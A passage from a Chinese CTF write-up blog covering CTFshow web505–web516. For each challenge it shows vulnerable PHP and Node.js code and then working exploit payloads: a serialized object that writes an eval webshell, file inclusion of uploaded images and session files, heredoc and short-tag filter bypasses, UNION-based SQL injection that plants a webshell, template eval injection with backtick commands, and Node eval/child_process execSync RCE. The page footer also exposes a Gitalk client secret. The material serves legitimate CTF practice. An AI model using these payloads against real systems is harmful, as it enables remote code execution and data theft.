+<pre><code>name=../config/settings&amp;content=%4f%3a%35%3a%22%64%62%4c%6f%67%22%3a%33%3a%7b%73%3a%33%3a%22%73%71%6c%22%3b%73%3a%30%3a%22%22%3b%73%3a%37%3a%22%63%6f%6e%74%65%6e%74%22%3b%73%3a%32%34%3a%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3f%3e%22%3b%73%3a%33%3a%22%6c%6f%67%22%3b%73%3a%31%39%3a%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%7d;
+</code></pre>
+<p>访问/api/admin_settings.php<br>
+连接1.php</p>
+<h2 id="web505">web505</h2>
+<p>增加了一个文件查看功能，用来看源码。<br>
+api/admin_file_view.php</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+
+error_reporting(0);
+$user= $_SESSION['user'];
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+
+	extract($_POST);
+	if($debug==1 &amp;&amp; preg_match('/^user/', file_get_contents($f))){
+		include($f);
+	}else{
+		$ret['data']=array('contents'=&gt;file_get_contents(__DIR__.'/../'.$name));
+	}
+	$ret['msg']='查看成功';
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>这里存在一个文件包含</p>
+<p>上传文件后</p>
+<pre><code>f=/var/www/html/img/4a47a0db6e60853dedfcfdf08a5ca249.png&amp;debug=1&amp;1=system('cat /flag_is_here_aabbcc');
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1723367239702.png" alt="" loading="lazy"></figure>
+<h2 id="web506">web506</h2>
+<p>api/admin_file_view.php</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+
+error_reporting(0);
+$user= $_SESSION['user'];
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+
+	extract($_POST);
+	$ext = substr($f, strlen($f)-3,3);
+	if(preg_match('/php|sml|phar/i', $ext)){
+		$ret['msg']='请不要使用此功能';
+		die(json_encode($ret));
+	}
+	if($debug==1 &amp;&amp; preg_match('/^user/', file_get_contents($f))){
+		include($f);
+	}else{
+		$ret['data']=array('contents'=&gt;file_get_contents(__DIR__.'/../'.$name));
+	}
+	$ret['msg']='查看成功';
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>增加了限制，文件名后缀不能为php,sml,phar</p>
+<p>用上题方法依然可以</p>
+<h2 id="web507">web507</h2>
+<h2 id="web508">web508</h2>
+<p>同上</p>
+<h2 id="web509">web509</h2>
+<p>api/admin_file_view.php</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+
+error_reporting(0);
+$user= $_SESSION['user'];
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+
+	extract($_POST);
+	if(preg_match('/php|sml|phar|\:|data|file/i', $f)){
+		$ret['msg']='请不要使用此功能';
+		die(json_encode($ret));
+	}
+	if($debug==1 &amp;&amp; preg_match('/^user/', file_get_contents($f))){
+		include($f);
+	}else{
+		$ret['data']=array('contents'=&gt;file_get_contents(__DIR__.'/../'.$name));
+	}
+	$ret['msg']='查看成功';
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>又增加了一些过滤，但还是可以利用。</p>
+<p>文件上传处，对内容也做了过滤<br>
+api/admin_upload.php</p>
+<pre><code class="language-php">&lt;?php
+$arr = $_FILES[&quot;file&quot;];
+	if(($arr[&quot;type&quot;]==&quot;image/jpeg&quot; || $arr[&quot;type&quot;]==&quot;image/png&quot; ) &amp;&amp; $arr[&quot;size&quot;]&lt;10241000 )
+	{
+		$arr[&quot;tmp_name&quot;];
+		$filename = md5($arr['name']);
+		$ext = pathinfo($arr['name'],PATHINFO_EXTENSION);
+		if(!preg_match('/^php$/i', $ext)){
+			if(preg_match('/php|sml|phar|\:|data|file/i', file_get_contents($arr[&quot;tmp_name&quot;]))){
+                	$ret['msg']='请不要使用此功能';
+                	die(json_encode($ret));
+        		}
+
+			$basename = &quot;../img/&quot;.$filename.'.' . $ext;
+			move_uploaded_file($arr[&quot;tmp_name&quot;],$basename);
+			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
+			$config['logo']=$filename.'.' . $ext;
+			file_put_contents(__DIR__.'/../config/settings', serialize($config));
+			$ret['msg']='文件上传成功';
+		}
+		
+	}else{
+		$ret['msg']='文件上传失败';
+	}
+</code></pre>
+<p>使用短标签，绕过<code>php</code>关键字</p>
+<pre><code class="language-php">user&lt;?= @eval($_POST[1]);?&gt;
+</code></pre>
+<h2 id="web510">web510</h2>
+<p>api/admin_upload.php</p>
+<pre><code class="language-php">&lt;?php
+$arr = $_FILES[&quot;file&quot;];
+	if(($arr[&quot;type&quot;]==&quot;image/jpeg&quot; || $arr[&quot;type&quot;]==&quot;image/png&quot; ) &amp;&amp; $arr[&quot;size&quot;]&lt;10241000 )
+	{
+		$arr[&quot;tmp_name&quot;];
+		$filename = md5($arr['name']);
+		$ext = pathinfo($arr['name'],PATHINFO_EXTENSION);
+		if(!preg_match('/^php$/i', $ext)){
+			if(preg_match('/php|sml|phar|\:|data|file|&lt;|&gt;|\`|\?|=/i', file_get_contents($arr[&quot;tmp_name&quot;]))){
+                	$ret['msg']='请不要使用此功能';
+                	die(json_encode($ret));
+        		}
+
+			$basename = &quot;../img/&quot;.$filename.'.' . $ext;
+			move_uploaded_file($arr[&quot;tmp_name&quot;],$basename);
+			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
+			$config['logo']=$filename.'.' . $ext;
+			file_put_contents(__DIR__.'/../config/settings', serialize($config));
+			$ret['msg']='文件上传成功';
+		}
+		
+	}else{
+		$ret['msg']='文件上传失败';
+	}
+</code></pre>
+<p>现在基本上内容全过滤了，无法绕过。</p>
+<p>查看session文件发现刚好满足，user开头的格式，并且内容可控。<br>
+<img src="https://fallingskies22.github.io/post-images/1723459255367.png" alt="" loading="lazy"></p>
+<p>查看生成session代码<br>
+index.php</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+include('render/render_class.php');
+include('render/db_class.php');
+
+
+$action=$_GET['action'];
+
+...
+
+switch ($action) {
+	case 'check':
+		$username=$_POST['username'];
+		$password=$_POST['password'];
+		if(!preg_match('/file|or|innodb|sys|mysql/i', $username)){
+			$sql = &quot;select username,nickname,avatar from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
+			$db=new db();
+			$user=$db-&gt;select_one_array($sql);
+		}
+		if($user){
+			$_SESSION['user']=$user;
+			header('location:index.php?action=index');
+		}else{
+			templateUtil::render('error');
+		}
+		break;
+	case 'clear':
+		system('rm -rf cache/*');
+		die('cache clear');
+		break;
+	case 'login':
+		templateUtil::render($action);
+		break;
+	case 'index':
+		$user=$_SESSION['user'];
+		if($user){
+			templateUtil::render('index',$user);
+		}else{
+			header('location:index.php?action=login');
+		}
+		break;
+	case 'view':
+		$user=$_SESSION['user'];
+		if($user){
+			templateUtil::render($_GET['page'],$user);
+		}else{
+			header('location:index.php?action=login');
+		}
+		break;
+	case 'logout':
+		session_destroy();
+		header('location:index.php?action=login');
+		break;
+	default:
+		templateUtil::render($action);
+		break;
+}
+
+</code></pre>
+<p>在基本资料处修改昵称为<code>&lt;?php @eval($_POST[1])?&gt;</code></p>
+<p>使用文件包含点<br>
+<img src="https://fallingskies22.github.io/post-images/1723460673813.png" alt="" loading="lazy"></p>
+<h2 id="web511">web511</h2>
+<p>sess也过滤了<br>
+api/admin_file_view.php</p>
+<pre><code class="language-php">&lt;?php
+extract($_POST);
+        if(preg_match('/php|sml|phar|\:|data|file|sess/i', $f)){
+                $ret['msg']='请不要使用此功能';
+                die(json_encode($ret));
+        }
+        if($debug==1 &amp;&amp; preg_match('/^user/', file_get_contents($f))){
+                include($f);
+        }else{
+                $ret['data']=array('contents'=&gt;file_get_contents(__DIR__.'/../'.$name));
+        }
+        $ret['msg']='查看成功';
+        die(json_encode($ret));
+</code></pre>
+<p>查看模板渲染代码<br>
+render/render_class.php</p>
+<pre><code class="language-php">&lt;?php
+
+include('file_class.php');
+include('cache_class.php');
+
+class templateUtil {
+	public static function render($template,$arg=array()){
+		$templateContent=fileUtil::read('templates/'.$template.'.sml');
+		$cache=templateUtil::shade($templateContent,$arg);
+		echo $cache;
+	}
+	public static  function shade($templateContent,$arg=array()){
+		$templateContent=templateUtil::checkImage($templateContent,$arg);
+		$templateContent=templateUtil::checkConfig($templateContent);
+		$templateContent=templateUtil::checkVar($templateContent,$arg);
+		foreach ($arg as $key =&gt; $value) {
+			$templateContent=str_replace('{{'.$key.'}}', $value, $templateContent);
+		}
+		return $templateContent;
+	}
+
+	public static function checkImage($templateContent,$arg=array()){
+		foreach ($arg as $key =&gt; $value) {
+			if(preg_match('/gopher|file/i', $value)){
+				$templateContent=str_replace('{{img:'.$key.'}}', '', $templateContent);
+			}
+			if(stripos($templateContent, '{{img:'.$key.'}}')){
+				$encode='';
+				if(file_exists(__DIR__.'/../cache/'.md5($value))){
+					$encode=file_get_contents(__DIR__.'/../cache/'.md5($value));
+				}else{
+					$ch=curl_init($value);
+					curl_setopt($ch, CURLOPT_HEADER, 0);
+					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+					$result=curl_exec($ch);
+					curl_close($ch);
+					$ret=chunk_split(base64_encode($result));
+					$encode = 'data:image/jpg/png/gif;base64,' . $ret;
+					file_put_contents(__DIR__.'/../cache/'.md5($value), $encode);
+				}
+				$templateContent=str_replace('{{img:'.$key.'}}', $encode, $templateContent);
+			}
+			
+		}
+		return $templateContent;
+	}
+	public static function checkConfig($templateContent){
+		$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
+		foreach ($config as $key =&gt; $value) {
+			if(stripos($templateContent, '{{config:'.$key.'}}')){
+				$templateContent=str_replace('{{config:'.$key.'}}', $value, $templateContent);
+			}
+			
+		}
+		return $templateContent;
+	}
+
+	public static function checkVar($templateContent,$arg){
+		foreach ($arg as $key =&gt; $value) {
+			if(stripos($templateContent, '{{var:'.$key.'}}')){
+				eval('$v='.$value.';');
+				$templateContent=str_replace('{{var:'.$key.'}}', $v, $templateContent);
+			}
+		}
+		return $templateContent;
+	}
+
+
+}
+</code></pre>
+<p><code>checkVar</code>函数中有<code>eval</code>函数，考虑利用它来命令执行。<br>
+这里要通过<code>stripos</code>函数，所以需要在标签前加其他字符。</p>
+<p>使用新增模板功能</p>
+<pre><code>new.sml
+123{{var:nickname}}
+</code></pre>
+<p>更改昵称为</p>
+<pre><code>`cat /flag_is_here_sf`
+</code></pre>
+<p>访问模板<br>
+<code>/index.php?action=view&amp;page=new</code></p>
+<h2 id="web512">web512</h2>
+<p>checkVar函数处增加了过滤</p>
+<pre><code class="language-php">&lt;?php
+public static function checkVar($templateContent,$arg){
+		$db=new db();
+		foreach ($arg as $key =&gt; $value) {
+			if(stripos($templateContent, '{{var:'.$key.'}}')){
+				if(!preg_match('/\(|\[|\`|\'|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|require|GET|POST|COOKIE|SESSION|file/i', $value)){
+					eval('$v='.$value.';');
+					$templateContent=str_replace('{{var:'.$key.'}}', $v, $templateContent);
+				}
+				
+			}
+		}
+		return $templateContent;
+	}
+</code></pre>
+<p>使用EOF来绕过引号</p>
+<pre><code>1;
+$a = &lt;&lt;&lt;EOF
+&lt;?php includ
+EOF;
+$b = &lt;&lt;&lt;EOF
+e $
+EOF;
+$c = &lt;&lt;&lt;EOF
+_POS
+EOF;
+$d = &lt;&lt;&lt;EOF
+T{1}?&gt;
+EOF;
+$e = &lt;&lt;&lt;EOF
+11.php
+EOF;
+$db-&gt;log-&gt;log=$e;
+$db-&gt;log-&gt;content=$a.$b.$c.$d;
+</code></pre>
+<p>使用登录处的sql注入来绕过修改信息时的长度限制。</p>
+<pre><code>action=check&amp;username=1'%20union%20select%20%22%31%3b%0a%24%61%20%3d%20%3c%3c%3c%45%4f%46%0a%3c%3f%70%68%70%20%69%6e%63%6c%75%64%0a%45%4f%46%3b%0a%24%62%20%3d%20%3c%3c%3c%45%4f%46%0a%65%20%24%0a%45%4f%46%3b%0a%24%63%20%3d%20%3c%3c%3c%45%4f%46%0a%5f%50%4f%53%0a%45%4f%46%3b%0a%24%64%20%3d%20%3c%3c%3c%45%4f%46%0a%54%7b%31%7d%3f%3e%0a%45%4f%46%3b%0a%24%65%20%3d%20%3c%3c%3c%45%4f%46%0a%31%31%2e%70%68%70%0a%45%4f%46%3b%0a%24%64%62%2d%3e%6c%6f%67%2d%3e%6c%6f%67%3d%24%65%3b%0a%24%64%62%2d%3e%6c%6f%67%2d%3e%63%6f%6e%74%65%6e%74%3d%24%61%2e%24%62%2e%24%63%2e%24%64%3b%22%2c2%2c3%23&amp;password=123&amp;random=1
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1723474298038.png" alt="" loading="lazy"></figure>
+<p>创建模板文件</p>
+<pre><code>123{{var:username}}
+</code></pre>
+<p>访问模板文件后，生成11.php<br>
+<img src="https://fallingskies22.github.io/post-images/1723474360958.png" alt="" loading="lazy"></p>
+<h2 id="web513">web513</h2>
+<p>render/render_class.php</p>
+<pre><code class="language-php">&lt;?php
+public static function checkVar($templateContent,$arg){
+		$db=new db();
+		foreach ($arg as $key =&gt; $value) {
+			if(stripos($templateContent, '{{var:'.$key.'}}')){
+				if(!preg_match('/\(|\[|\`|\'|\$|\_|\&lt;|\?|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|GET|POST|COOKIE|SESSION|file/i', $value)){
+					eval('$v='.$value.';');
+					$templateContent=str_replace('{{var:'.$key.'}}', $v, $templateContent);
+				}
+				
+			}
+		}
+		return $templateContent;
+	}
+
+	public static function checkFoot($templateContent){
+		if ( stripos($templateContent, '{{cnzz}}')) {
+			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
+			$foot = $config['cnzz'];
+			if(is_file($foot)){
+				$foot=file_get_contents($foot);
+				include($foot);
+			}
+			
+		}
+		return $templateContent;
+	}
+</code></pre>
+<p>checkVar函数又增加了过滤，无法绕过。<br>
+增加了一个checkFoot函数。</p>
+<p>修改昵称为</p>
+<pre><code class="language-php">&lt;?=`cat /f*`?&gt;
+</code></pre>
+<p>创建模板文件path.sml</p>
+<pre><code>/tmp/sess_tjr3uviphhcn9f3cocfi77gl37
+</code></pre>
+<p>创建模板文件new.sml</p>
+<pre><code>123{{cnzz}}
+</code></pre>
+<p>修改系统配置中页面统计处为<code>/var/www/html/templates/path.sml</code></p>
+<p>访问<code>/index.php?action=view&amp;page=new</code>触发checkFoot函数即可。</p>
+<h2 id="web514">web514</h2>
+<p>checkFoot函数也增加了过滤</p>
+<pre><code class="language-php">&lt;?php
+public static function checkFoot($templateContent){
+		if ( stripos($templateContent, '{{cnzz}}')) {
+			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
+			$foot = $config['cnzz'];
+			if(is_file($foot)){
+				$foot=file_get_contents($foot);
+				if(!preg_match('/&lt;|&gt;|\?|=|php|sess|log|phar|\.|\[|\{|\(|_/', $foot)){
+					include($foot);
+				}
+				
+			}
+			
+		}
+		return $templateContent;
+	}
+</code></pre>
+<p>创建模板文件path.sml</p>
+<pre><code>/var/www/html/config/settings
+</code></pre>
+<p>创建模板文件new.sml</p>
+<pre><code>123{{cnzz}}
+</code></pre>
+<p>修改系统配置中页面统计处为<code>/var/www/html/templates/path.sml</code></p>
+<p>修改系统配置中备案号为</p>
+<pre><code>&lt;?=`cat /flag_is_here_es`?&gt;
+</code></pre>
+<p>访问<code>/index.php?action=view&amp;page=new</code>触发checkFoot函数即可。</p>
+<h2 id="web515">web515</h2>
+<p>nodejs的题目</p>
+<pre><code class="language-js">var express = require('express');
+var _= require('lodash');
+var router = express.Router();
+
+/* GET users listing. */
+router.get('/', function(req, res, next) {
+  res.render('index', { title: '我是复读机' });
+});
+
+router.post('/',function(req,res,next){
+	if(req.body.user!=null){
+		msg = req.body.user;
+		if((msg.match(/proto|process|require|exec|var|'|&quot;|:|\[|\]|[0-9]/))!==null || msg.length&gt;40){
+		  	res.render('index', { title: '敏感信息不复读' });
+		}else{
+			res.render('index', { title: eval(msg) });
+		}
+	}else{
+		res.render('index', { title: '我是复读机' });
+	}
+	 
+});
+module.exports = router;
+</code></pre>
+<p>命令执行绕过<br>
+利用request参数来绕过</p>
+<p>payload</p>
+<pre><code>?id=require(&quot;child_process&quot;).execSync(&quot;env&quot;);
+
+user=eval(req.query.id)
+</code></pre>
+<h2 id="web516">web516</h2>
+<p>routes/index.js</p>
+<pre><code class="language-js">const router = require('koa-router')()
+const User = require('../models/User.js')
+const md5 = require('md5-node')
+
+router.get('/', async (ctx, next) =&gt; {
+	await ctx.render('index',{msg:'ctfshow'});
+	await next();
+
+});
+
+router.post('/signin',async(ctx,next)=&gt;{
+  const username = ctx.request.body.username;
+  const password = ctx.request.body.password;
+  if(username=='admin'){
+  	ctx.body={
+  		code:'403',
+  		msg:'you are not admin'
+  	};
+  	return;
+  }
+  const user = await User.findAll({
+  	where:{
+  		username:username,
+  		password:password
+  	}
+  });
+
+  if(user[0]!==undefined){
+  	ctx.body={
+  		code:'200',
+  		url:'user/'+user[0].id
+  	}
+  }else{
+  	ctx.body={
+  		code:'404',
+  		msg:'login failed'
+  	};
+  }
+  
+});
+
+router.post('/signup',async(ctx,next)=&gt;{
+	  const username = ctx.request.body.username;
+	  const password = ctx.request.body.password;
+	  if(username=='admin'){
+	  	ctx.body={
+  		code:'403',
+  		msg:'you are not admin'
+  		};
+	  	return;
+	  }
+	  const u = await User.create({username:username,password:password})
+	  ctx.body={
+	  	code:0,
+	  	msg:'注册成功'
+	  }
+});
+
+router.get('/user/:id',async(ctx,next)=&gt;{
+	const id=ctx.params.id;
+	if(id==1){
+	  	ctx.body={
+  		code:'403',
+  		msg:'非管理员无权查看'
+  		};
+	  	return;
+	  }
+	const user = await User.findAll({
+		where:{
+			id:id
+		}
+	});
+
+	if(user!==undefined){
+		ctx.body='&lt;h3&gt;Hello '+user[0].username+'&lt;/h3&gt; your name is: '+user[0].username+' your id is: '+user[0].id+ ' your password is: '+eval('md5('+user[0].password+')');
+	}else{
+		ctx.render('/');
+	}
+});
+module.exports = router
+</code></pre>
+<p>app.js</p>
+<pre><code class="language-js">const Koa = require('koa')
+const app = new Koa()
+const views = require('koa-views')
+const json = require('koa-json')
+const onerror = require('koa-onerror')
+const bodyparser = require('koa-bodyparser')
+const logger = require('koa-logger')
+
+const index = require('./routes/index')
+const users = require('./routes/users')
+
+// error handler
+onerror(app)
+
+// middlewares
+app.use(bodyparser({
+  enableTypes:['json', 'form', 'text']
+}))
+app.use(json())
+app.use(logger())
+app.use(require('koa-static')(__dirname + '/public'))
+
+app.use(views(__dirname + '/views', {
+  extension: 'ejs'
+}))
+
+// logger
+app.use(async (ctx, next) =&gt; {
+  const start = new Date()
+  await next()
+  const ms = new Date() - start
+  console.log(`${ctx.method} ${ctx.url} - ${ms}ms`)
+})
+
+app.use(async(ctx,next)=&gt;{
+	if(ctx.request.body.password!==undefined &amp;&amp; (ctx.request.body.password.match(/proto|JSON|parse|process|require|exec|var|merge|response|body|request/))!==null){
+		return
+	}else{
+		await next()
+	}
+	
+})
+
+// routes
+app.use(index.routes(), index.allowedMethods())
+app.use(users.routes(), users.allowedMethods())
+
+// error-handling
+app.on('error', (err, ctx) =&gt; {
+  console.error('server error', err, ctx)
+});
+
+module.exports = app
+</code></pre>
+<p>注册账号</p>
+<pre><code>username=hello&amp;password=1)%2beval(eval(`ctx.requ`%2b`est.query.id`)
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1723630212531.png" alt="" loading="lazy"></figure>
+<p>登录账号后通过id访问</p>
+<pre><code>/user/16?id=require(&quot;child_process&quot;).execSync(&quot;env&quot;);
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://fallingskies22.github.io/post-images/1723630246169.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ji-mu-bao-biao-cun-zai-aviatort-biao-da-shi-zhu-ru-lou-dong/">
+                  <h3 class="post-title">
+                    积木报表存在aviator表达式注入漏洞
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
